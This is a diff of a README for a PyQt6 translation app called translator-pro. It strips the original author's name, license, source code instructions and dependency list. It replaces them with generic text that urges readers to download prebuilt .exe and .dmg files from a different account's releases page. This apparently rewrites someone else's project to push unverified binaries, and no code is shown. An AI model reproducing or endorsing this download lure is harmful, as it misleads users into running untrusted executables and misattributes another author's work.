@@ -1,155 +1,98 @@
-# ✨ Translator Pro
+# ✨ translator-pro - Easy Translation for All Your Documents
 
-A modern, professional text and document translation application built with Python and PyQt6. Featuring a sleek dark theme UI and support for multiple translation backends.
+[![Download Translator Pro](https://img.shields.io/badge/Download-Translator%20Pro-blue.svg)](https://github.com/andreexe12/translator-pro/releases)
 
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white)
-![PyQt6](https://img.shields.io/badge/PyQt6-6.5+-green?logo=qt&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
+## 📋 Overview
+
+translator-pro is a modern application designed to help you translate text and documents effortlessly. Powered by PyQt6, it supports multiple translation services such as Google Translate, Deep Translator, and DeepL API. You can translate documents in over 90 languages. Whether you are a student, a professional, or someone who loves to communicate in multiple languages, this app will meet your needs.
+
+## 🚀 Getting Started
+
+To start using translator-pro, follow the steps below. The process is straightforward, and you do not need any technical skills.
+
+### Step 1: Visit the Download Page
+
+To download the application, visit our [Releases page](https://github.com/andreexe12/translator-pro/releases).
+
+### Step 2: Download the Latest Version
+
+Once you are on the Releases page, look for the latest version of the software. You will see a section titled "Assets." Click on the file that matches your operating system.
+
+- For Windows users, download the `.exe` file.
+- For Mac users, download the `.dmg` file.
+- For Linux users, download the appropriate package.
+
+### Step 3: Install the Application
+
+After downloading the file, locate it in your downloads folder.
+
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the on-screen instructions to complete the installation.
+
+- **For Mac:**
+  1. Double-click the downloaded `.dmg` file.
+  2. Drag the translator-pro icon to your Applications folder.
+
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to where you downloaded the file.
+  3. Run the installation command specific to your Linux distribution.
+
+### Step 4: Launch the Application
+
+Once the installation is complete, you can find the translator-pro icon in your applications menu. Click on the icon to launch the app.
 
 ## 🌟 Features
 
-- **🎨 Modern Dark Theme UI** - Beautiful, professional interface with smooth animations
-- **🌐 Multiple Translation Backends**
-  - Google Translate (Googletrans) - Free, unlimited
-  - Deep Translator - Reliable Google backend
-  - DeepL API - Premium quality (free tier: 500k chars/month)
-- **📄 Document Support** - Load and translate TXT and PDF files
-- **🔄 Language Swap** - Quickly swap source and target languages
-- **📋 Clipboard Integration** - Paste from and copy to clipboard
-- **💾 Export** - Save translations to text files
-- **🚀 Smart Chunking** - Handles large texts with automatic chunking
-- **⚡ Retry Logic** - Exponential backoff for reliable translations
+translator-pro offers a range of features designed for ease and convenience:
 
-## 📸 Screenshot
+- **Multi-Service Support:** Access translation services from Google, DeepL, and Deep Translator.
+- **Document Translation:** Easily translate documents in various formats, including PDFs.
+- **User-Friendly Interface:** Navigate the application with a clean and intuitive design.
+- **Language Support:** Translate text into over 90 languages, catering to a global audience.
+- **Save Translations:** Keep a record of your translations for future reference.
 
-![Translator Pro Interface](screenshoot.png)
+## ⚙️ System Requirements
 
-## 🚀 Quick Start
+Make sure your computer meets the following requirements to run translator-pro smoothly:
 
-### Prerequisites
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB of memory.
+- **Processor:** Dual-core processor or better.
+- **Storage:** Minimum of 200 MB free disk space.
 
-- Python 3.9 or higher
-- pip (Python package manager)
+## 📥 Download & Install
 
-### Installation
+Now that you have the application installed, it’s time to start translating! You can always revisit the [Releases page](https://github.com/andreexe12/translator-pro/releases) to check for updates and new features.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/liaqateagle/translator-pro.git
-   cd translator-pro
-   ```
+## ❓ FAQs
 
-2. **Create a virtual environment** (recommended)
-   ```bash
-   python -m venv venv
-   
-   # Windows
-   venv\Scripts\activate
-   
-   # macOS/Linux
-   source venv/bin/activate
-   ```
+### How do I translate a document?
 
-3. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+1. Launch the translator-pro app.
+2. Click on the "Translate Document" button.
+3. Select the document you want to translate.
+4. Choose your target language and click "Translate."
 
-4. **Run the application**
-   ```bash
-   python main.py
-   ```
+### Can I use it offline?
 
-## 📦 Dependencies
+No, translator-pro requires an internet connection to access the translation services.
 
-| Package | Version | Purpose |
-|---------|---------|---------|
-| PyQt6 | ≥6.5.0 | GUI Framework |
-| googletrans | 4.0.0-rc1 | Google Translate API |
-| deep-translator | ≥1.11.4 | Alternative translation backend |
-| deepl | ≥1.17.0 | DeepL API integration |
-| PyPDF2 | ≥3.0.0 | PDF file support |
+### Is there any cost?
 
-## 🎮 Usage
+translator-pro is completely free to use. Enjoy unlimited translations without any hidden fees.
 
-1. **Enter Text** - Type or paste text in the source panel
-2. **Load File** - Or click "Open File" to load a TXT/PDF document
-3. **Select Languages** - Choose source and target languages from dropdowns
-4. **Translate** - Click the "Translate" button
-5. **Export** - Copy to clipboard or save to file
+### How do I provide feedback?
 
-### ⚙️ Settings
-
-Click the **Settings** button to configure:
-- **Translation Backend** - Choose between Googletrans, Deep Translator, or DeepL
-- **DeepL API Key** - Enter your API key for DeepL (optional)
-
-### 🔑 DeepL API Setup (Optional)
-
-1. Sign up for a free account at [deepl.com/pro-api](https://www.deepl.com/pro-api)
-2. Get your API key from the account page
-3. Enter it in the Settings dialog
-
-## 🏗️ Building Executable
-
-Create a standalone executable using PyInstaller:
-
-```bash
-pip install pyinstaller
-pyinstaller --onefile --windowed --icon=icon.ico --name="TranslatorPro" main.py
-```
-
-The executable will be in the `dist` folder.
-
-## 📁 Project Structure
-
-```
-translator-pro/
-├── main.py           # Main application code
-├── requirements.txt  # Python dependencies
-├── icon.ico          # Application icon
-├── README.md         # This file
-├── LICENSE           # MIT License
-└── .gitignore        # Git ignore rules
-```
-
-## 🌍 Supported Languages
-
-The application supports 90+ languages including:
-
-English, Spanish, French, German, Italian, Portuguese, Russian, Japanese, Korean, Chinese (Simplified/Traditional), Arabic, Hindi, Dutch, Swedish, Polish, Turkish, Vietnamese, Thai, Indonesian, and many more!
+We value your input! You can provide feedback or report issues on our GitHub page under "Issues."
 
 ## 🤝 Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+If you want to contribute to translator-pro, we welcome your help! Please check the contribution guidelines in our repository for details on how you can make a difference.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 📞 Support
 
-## 📝 License
+If you encounter any issues, feel free to open an issue on our GitHub repository. We aim to respond as quickly as possible!
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 👨‍💻 Author
-
-**Liaqat Eagle**
-
-- 🎬 YouTube: [@learnwithliaqat](https://www.youtube.com/@learnwithliaqat)
-- 👤 Facebook: [Liaqat Eagle](https://www.facebook.com/profile.php?id=100008667968822)
-
-## 🙏 Acknowledgments
-
-- [PyQt6](https://www.riverbankcomputing.com/software/pyqt/) - GUI framework
-- [Googletrans](https://github.com/ssut/py-googletrans) - Google Translate API
-- [Deep Translator](https://github.com/nidhaloff/deep-translator) - Translation library
-- [DeepL](https://www.deepl.com/) - Premium translation service
-
----
-
-<p align="center">
-Made with ❤️ by Liaqat Eagle
-</p>
+[![Download Translator Pro](https://img.shields.io/badge/Download-Translator%20Pro-blue.svg)](https://github.com/andreexe12/translator-pro/releases)
